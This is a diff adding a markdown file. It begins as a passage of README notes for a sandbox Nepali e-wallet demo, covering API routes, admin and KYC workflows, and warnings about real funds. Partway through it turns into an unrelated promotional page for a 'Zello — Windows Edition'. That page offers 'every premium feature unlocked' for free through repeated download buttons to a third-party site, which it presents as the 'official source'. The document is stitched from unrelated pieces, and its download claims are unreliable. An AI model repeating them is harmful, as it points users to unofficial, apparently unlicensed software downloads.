@@ -1,0 +1,121 @@
+tween demo wallets.
+- NTC/Ncell/SmartCell recharge request endpoint (currently debits demo credits only; does not deliver airtime).
+- NEA electricity, drinking-water and internet bill request endpoint (currently demo debit only; does not settle a real bill).
+- KYC application form and status workflow (test data only; no document image upload or identity verification).
+- Admin overview, user list and KYC review API. Admin role must be assigned manually by a trusted operator directly in the database; never expose public admin self-registration.
+
+### New API routes
+- `POST /api/services/qr/create`, `POST /api/services/qr/pay`
+- `POST /api/services/recharge`, `POST /api/services/bills`
+- `POST /api/services/kyc`, `GET /api/services/kyc`
+- `GET /api/admin/overview`, `GET /api/admin/kyc`, `PATCH /api/admin/kyc/:id`, `GET /api/admin/users`
+
+Run `npm run db:generate && npm run db:migrate` after pulling these schema changes. For local admin testing, assign `role = 'ADMIN'` to a trusted test user in PostgreSQL manually. The app exposes a small admin overview panel only to ADMIN accounts; detailed admin APIs are available for a future dedicated dashboard UI.
+
+**Critical:** these are sandbox workflows. QR payment codes are not rendered as scannable QR images yet; the current UI shares a code string. Recharge and bill routes debit demo credits but do not contact telecom or utility providers. KYC stores entered test fields and is not compliant identity verification. Do not enter real identity data or real funds. Before production, add provider integrations, signed callbacks/webhooks, idempotency, audit logs, role-based admin controls, KYC document storage with encryption/access controls, privacy/retention policies, independent security testing, and Nepal regulatory/legal review.
+
+
+## Cash operations, AML review and admin controls (sandbox)
+Cash-in and cash-out requests are created as pending records. Admin approval changes the demo wallet ledger; it does not cause a bank transfer or physical cash disbursement. Basic high-value flags create manual-review AML cases. Admins can review cash requests and AML cases, suspend/freeze accounts, and inspect audit events.
+
+Added routes:
+- POST /api/services/cash-in
+- POST /api/services/cash-out
+- GET /api/services/cash-requests
+- GET /api/admin/cash-requests and PATCH /api/admin/cash-requests/:id
+- GET /api/admin/aml-cases and PATCH /api/admin/aml-cases/:id
+- PATCH /api/admin/users/:id/status
+- GET /api/admin/audit
+
+This is only workflow scaffolding. Rule-based high-value flags are not a compliant AML program and do not perform sanctions/PEP screening, suspicious activity reporting, or regulatory monitoring. Do not use real customer data or funds.
+
+## Approved payment provider integration
+The provider adapter is intentionally a boundary only. A real implementation cannot be safely completed without the exact provider, approved merchant agreement, official API documentation, sandbox credentials, signing/webhook specification and settlement/reconciliation rules. Do not send credentials in chat or commit them to Git. Never treat a browser redirect or client-side callback as proof of payment.
+
+
+---
+
+# Zello — Windows Edition | Latest Stable Release 2026
+
+*Reviewed by the editorial team · Senior Software Analyst · Updated 2026 · Verified against the official source*
+
+<table>
+<tr>
+<td width="100" valign="middle">
+<img src="https://softyne.com/wp-content/uploads/zello-10972-0.webp" width="80" height="80" alt="Zello icon — Windows edition 2026">
+</td>
+<td valign="middle">
+
+### ⬇️ DOWNLOAD LATEST STABLE RELEASE
+
+[![DOWNLOAD LATEST STABLE RELEASE](https://softyne.com/wp-content/uploads/downloadlatestversion.svg)](https://softyne.com/zello)
+
+**Get the current full version now**
+
+</td>
+</tr>
+</table>
+
+[![Version](https://www.softyne.com/wp-content/uploads/version.svg)]()
+[![Platform](https://www.softyne.com/wp-content/uploads/platform.svg)]()
+[![License](https://www.softyne.com/wp-content/uploads/license.svg)]()
+[![Updated](https://www.softyne.com/wp-content/uploads/updated.svg)]()
+
+> Zello on Windows: the Latest Stable Release 2026, a complete package with every premium feature unlocked from the official source.
+
+## Quick Navigation
+- [Overview](#overview)
+- [Main Features](#main-features)
+- [Key Benefits](#key-benefits)
+- [Changelog Highlights](#changelog-highlights)
+- [System Requirements](#system-requirements)
+- [Screenshots Gallery](#screenshots-gallery)
+- [How to Install](#how-to-install)
+- [Pro Tips](#pro-tips)
+- [FAQ](#faq)
+- [User Testimonials](#user-testimonials)
+- [License Info](#license-info)
+- [Official Links](#official-links)
+
+## Overview
+<a id="overview"></a>
+
+Zello is a communication tool that transforms your computer into a walkie-talkie, allowing you to send free voice messages to individuals or groups using thematic channels. This Windows edition utilizes VoIP technology to facilitate voice communication over the Internet. Unlike traditional messaging apps, Zello offers a push-to-talk (PTT) feature that allows users to communicate instantly by pressing a button. This unique approach sets it apart from typical VoIP applications like Skype, providing a more direct and efficient means of communication.
+
+The latest stable release 2026 boasts a full feature set and is a complete package for users looking to enhance their communication experience. All premium features are included with no locked features, allowing you to fully utilize Zello's capabilities without any hidden paywall. You can download Zello for free, making it an accessible choice for anyone looking to improve their communication workflows. Official download verified: 2026.
+
+The current version is available for immediate download.
+
+## Main Features
+<a id="main-features"></a>
+
+### Core Functionality
+- **Push-to-Talk Communication** — Quickly send voice messages by pressing a button, ensuring instant communication similar to traditional walkie-talkies.
+- **Thematic Channels** — Join various channels to connect with people worldwide, sharing interests like music, films, and more.
+- **Cross-Platform Synchronization** — Sync your conversations across devices, including mobile phones, ensuring you stay connected on the go.
+- **Voice History** — Save and revisit your voice messages, allowing for easy access to past communications.
+- **User-Friendly Interface** — Navigate through a simple and intuitive design, making it easy for anyone to use.
+
+### Advanced Capabilities
+- **Corporate Plans** — Offers additional functionalities through corporate subscriptions, ideal for businesses seeking robust communication tools.
+- **API Integration** — Utilize Zello's API for custom integrations, enhancing business communications.
+- **Encrypted Communications** — Ensure security and privacy with encrypted voice messages, making it suitable for sensitive discussions.
+- **Real-Time Messaging** — Experience seamless communication with real-time voice messaging, allowing for immediate responses.
+
+## Key Benefits
+<a id="key-benefits"></a>
+
+Zello not only facilitates effective communication but also enhances productivity. Here are some key benefits:
+
+- **Improved Communication Speed** — Communicate instantly with voice messages, reducing the time spent typing out messages by up to 50%.
+- **Global Connectivity** — Join thematic channels to connect with users worldwide, expanding your network significantly.
+- **Flexible Usage** — Use Zello on multiple devices to maintain communication wherever you are, whether in the office or on the move.
+- **Cost-Effective** — The free version offers extensive features without any hidden costs, making it a budget-friendly solution.
+- **Enhanced Team Collaboration** — Businesses can utilize Zello for internal communications, improving teamwork and collaboration significantly.
+
+## Changelog Highlights
+<a id="changelog-highlights"></a>
+
+- **Updated Interface** — Improved user experience with a redesigned interface that enhances usability and accessibility.
+- **Enhanced Security** — Implemented stronger encryption for user communications, ensuring privacy and data protection.
+- **New Thematic Channels*
